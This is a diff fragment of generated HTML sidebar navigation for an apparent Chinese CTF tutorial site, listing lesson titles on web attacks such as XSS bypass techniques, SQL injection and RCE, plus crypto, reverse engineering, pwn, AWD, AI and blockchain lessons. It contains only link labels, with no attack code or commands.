+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_6" id="__nav_1_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web | 网络攻防
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_start/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web入门题单
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sensitive_info/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    敏感信息泄露
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php_basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP基础
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php_unser_base/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP反序列化基础
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php_features.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP特性
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql_injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS攻击
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        类型介绍
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="类型介绍">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反射型(Reflected XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储型(Stored XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domdom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM型(DOM-based XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常见攻击向量
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实战">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储型 XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#referer-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referer XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-agent-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User-Agent XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookie XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#angular-js-ng-include-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Angular JS ng-include XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        回车代替空格绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        短标签绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#angular-js-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Angular JS 模板注入 XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM 跳转 XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        / 代替空格绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        URL XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        闭合绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        事件绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-href" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        a href 绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        大小写绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        双写绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unicode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unicode 编码绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        注释绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../include/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssti/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php_code_audit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP 代码审计
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rce/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file_upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dir_traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    目录穿越
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../logical_vuln/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逻辑漏洞
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../any_file_read/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    任意文件读取
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-crypto/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crypto | 密码学
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_7" id="__nav_1_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Crypto | 密码学
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-crypto/Recap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    前情提要
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-crypto/Encode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    编码基础
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-crypto/Classicalcipher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    古典密码
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-crypto/Moderncipher.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    现代密码
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_8" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-reverse/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse | 逆向工程
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_8" id="__nav_1_8_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reverse | 逆向工程
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82F%26Q/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    引导篇：灵魂F&Q
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quick Start：可执行文件
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quick Start：ASM汇编
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-reverse/Quick%20Start%EF%BC%9AExample%20problems/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quick Start：Example problems
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84IDA/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    从零开始的IDA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    从零开始的壳
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_9" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-pwn/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn | 二进制安全
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_9" id="__nav_1_9_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pwn | 二进制安全
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/wsl2_environment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    wsl2下的环境配置
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/Asm_x86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    汇编语言(x86)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/Stack_Overflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    栈上数组越界&栈溢出
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/ROP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ROP入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/ROP_Tricks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    常见的ROP技巧
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/Protections.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    常见保护
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-pwn/Tricks.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    杂七杂八的解题技巧
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_10" id="__nav_1_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWD | 攻防模式
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    AWD | 攻防模式
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-awd/awd_about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWD介绍
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-awd/awd_platform/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWD平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-awd/awd_web.exp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    【WEB】AWD技巧
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-awd/awd_pwn.exp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    【PWN】AWD技巧
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_11" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-ai/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AI | 人工智能安全
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1_11" id="__nav_1_11_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    AI | 人工智能安全
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-ai/What_is_AI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    初识AI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-ai/MLP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    你的第一个神经网络
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_12" id="__nav_1_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    blockchain | 区块链安全
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    blockchain | 区块链安全
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_12_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_12_1" id="__nav_1_12_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Move
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_12_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_12_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Move
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-blockchain/Move/0x00/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    从0开始的签到题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-blockchain/Move/0x01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    独特的所有权
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-blockchain/Move/0x02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    神奇的时钟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-blockchain/Move/0x03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    对象与燃气
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-blockchain/Move/0x04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    多样的泛型
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_13" id="__nav_1_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    附录
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    附录
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-appendix/how-to-ask/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    提问的智慧
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-appendix/CTFevent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF赛事
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-appendix/NSSCTF_Usage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSSCTF平台使用
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-appendix/book/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    推荐书单
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-tags/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    知识点标签
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    知识点标签
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
